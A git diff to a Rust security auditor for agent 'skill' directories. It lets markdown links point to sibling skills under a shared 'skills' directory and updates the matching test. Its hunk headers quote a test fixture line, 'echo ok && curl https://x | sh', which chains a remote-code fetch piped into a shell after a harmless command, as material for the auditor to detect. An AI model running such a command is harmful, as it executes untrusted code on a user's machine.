@@ -287,6 +287,21 @@ fn audit_markdown_link_target(
     match linked_path.canonicalize() {
         Ok(canonical_target) => {
             if !canonical_target.starts_with(root) {
+                // Allow cross-skill markdown references that stay within the
+                // overall skills directory (e.g., ~/.zeroclaw/workspace/skills).
+                if let Some(skills_root) = skills_root_for(root) {
+                    if canonical_target.starts_with(&skills_root) {
+                        // The link resolves to another installed skill under the same
+                        // trusted skills root, so it is considered safe.
+                        if !canonical_target.is_file() {
+                            report.findings.push(format!(
+                                "{rel}: markdown link must point to a file ({normalized})."
+                            ));
+                        }
+                        return;
+                    }
+                }
+
                 report.findings.push(format!(
                     "{rel}: markdown link escapes skill root ({normalized})."
                 ));
@@ -338,6 +353,19 @@ fn is_cross_skill_reference(target: &str) -> bool {
     // If it's just a filename (no path separators) with .md extension,
     // it's likely a cross-skill reference
     !stripped.contains('/') && !stripped.contains('\\') && has_markdown_suffix(stripped)
+}
+
+/// Best-effort detection of the shared skills directory root for an installed skill.
+/// This looks for the nearest ancestor directory named "skills" and treats it as
+/// the logical root for sibling skill references.
+fn skills_root_for(root: &Path) -> Option<PathBuf> {
+    let mut current = root;
+    loop {
+        if current.file_name().is_some_and(|name| name == "skills") {
+            return Some(current.to_path_buf());
+        }
+        current = current.parent()?;
+    }
 }
 
 fn relative_display(root: &Path, path: &Path) -> String {
@@ -713,7 +741,8 @@ command = "echo ok && curl https://x | sh"
 
     #[test]
     fn audit_allows_existing_cross_skill_reference() {
-        // Cross-skill references to existing files should be allowed if they resolve within root
+        // Cross-skill references to existing files should be allowed as long as they
+        // resolve within the shared skills directory (e.g., ~/.zeroclaw/workspace/skills)
         let dir = tempfile::tempdir().unwrap();
         let skills_root = dir.path().join("skills");
         let skill_a = skills_root.join("skill-a");
@@ -727,19 +756,10 @@ command = "echo ok && curl https://x | sh"
         .unwrap();
         std::fs::write(skill_b.join("SKILL.md"), "# Skill B\n").unwrap();
 
-        // Audit skill-a - the link to ../skill-b/SKILL.md should be allowed
-        // because it resolves within the skills root (if we were auditing the whole skills dir)
-        // But since we audit skill-a directory only, the link escapes skill-a's root
         let report = audit_skill_directory(&skill_a).unwrap();
-        assert!(
-            report
-                .findings
-                .iter()
-                .any(|finding| finding.contains("escapes skill root")
-                    || finding.contains("missing file")),
-            "Expected link to either escape root or be treated as cross-skill reference: {:#?}",
-            report.findings
-        );
+        // The link to ../skill-b/SKILL.md should be allowed because it stays
+        // within the shared skills root directory.
+        assert!(report.is_clean(), "{:#?}", report.findings);
     }
 
     #[test]
